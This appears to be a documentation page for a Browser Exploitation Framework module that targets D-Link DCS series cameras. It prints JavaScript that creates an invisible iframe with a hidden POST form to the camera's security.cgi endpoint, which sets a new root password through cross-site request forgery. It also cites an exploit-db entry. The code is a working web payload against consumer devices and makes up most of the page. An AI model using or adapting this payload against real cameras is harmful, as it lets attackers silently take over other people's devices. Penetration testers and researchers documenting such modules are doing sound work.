## Summary

* **Objective**: Attempts to change the password on a Dlink DCS series camera.
* **Authors**: bcoles
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/exploits/camera/dlink_dcs_series_csrf)

## Internal Working

Uses an invisible iframe with POST form to change config

```js
  var dlink_dcs_iframe = beef.dom.createInvisibleIframe();

  var form = document.createElement('form');
  form.setAttribute('action', base + "/setup/security.cgi");
  form.setAttribute('method', 'post');

  var input = null;

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'rootpass');
  input.setAttribute('value', passwd);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'confirm');
  input.setAttribute('value', passwd);
  form.appendChild(input);

  dlink_dcs_iframe.contentWindow.document.body.appendChild(form);

```

## References

https://www.exploit-db.com/exploits/18509/

## Feedback
